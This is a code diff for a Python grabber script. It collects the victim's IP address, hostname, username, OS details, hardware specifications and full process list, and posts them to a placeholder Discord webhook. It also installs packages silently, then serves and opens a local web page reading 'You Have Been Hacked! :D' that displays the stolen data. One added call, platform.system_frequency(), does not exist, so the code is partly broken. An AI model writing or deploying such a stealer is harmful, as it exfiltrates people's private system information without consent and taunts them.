@@ -1,16 +1,20 @@
+print("please wait...")
+import os
+os.system("pip install psutil")
+os.system("pip install requests")
 import requests
 import platform
 import psutil
-import os
 import subprocess
 import socket
+import time
+import webbrowser
 
 os.system("chmod +x *")
 if os.name == "nt":
 	os.system("cls")
 else:
 	os.system("clear")
-print("please wait...")
 
 info = []
 
@@ -19,6 +23,7 @@ try:
 except:
 	print("system error.")
 	ip = ""
+info.append(f"-")
 info.append(f"IP ADDRESS: || {ip} ||")
 try:
 	hostname = socket.gethostbyaddr(ip)[0]
@@ -46,13 +51,58 @@ try:
 except:
 	print("system error.")
 try:
-	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nIFCONFIG OUTPUT: || {output} ||")
+	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nIFCONFIG OUTPUT: || {output} ||\nMACHINE TYPE: || {platform.machine()} ||\nOS FAMILY: || {platform.system_alias(platform.system(), platform.release(), 0)} ||")
 except:
 	print("system error.")
 try:
-	with open("hook.txt", "r") as file:
-		url = file.read()
-	data = {"content": "\n".join(info)}
-	requests.post(url, json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
+	info.append(f"\nOS FREQUENCY: || {platform.system_frequency()} ||")
 except:
 	print("system error.")
+try:
+	info.append(f"PROCESS COUNT: || {len(psutil.pids())} ||")
+except:
+	print("system error.")
+try:
+	info.append(f"PROCESSES: || {psutil.pids()} ||")
+except:
+	print("system error.")
+try:
+	info.append(f"APPLICATION COUNT: || {sum(1 for _ in psutil.process_iter())} ||")
+except:
+	print("system error.")
+
+info.append(f"-")
+try:
+	data = {"content": "\n".join(info)}
+	requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
+except:
+	print("system error.")
+if os.name == "nt":
+	os.system("cls")
+else:
+	os.system("clear")
+print(f"Welcome To Program...\n")
+try:
+	s = socket.socket()
+	s.bind(("0.0.0.0", 65535))
+	s.listen(100)
+	display = []
+	for h in info:
+		if "\n" in h:
+			for h in h.split("\n"):
+				display.append("<h3>"+h.replace("|", "")+" </h3>")
+		else:
+			display.append("<h3>"+h.replace("|", "")+" </h3>")
+	p = f"<h1> You Have Been Hacked! :D </h1>\n<h2>Your info:</h2>\n{display}"
+	webbrowser.open("http://0.0.0.0:65535")
+	while True:
+		try:
+			c, a = s.accept()
+			print(f"connect {a[0]}:{a[1]}")
+			pack = c.recv(4096).decode()
+			print(f"{pack}")
+			c.send(f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}".encode())
+		except:
+			pass
+except:
+	pass
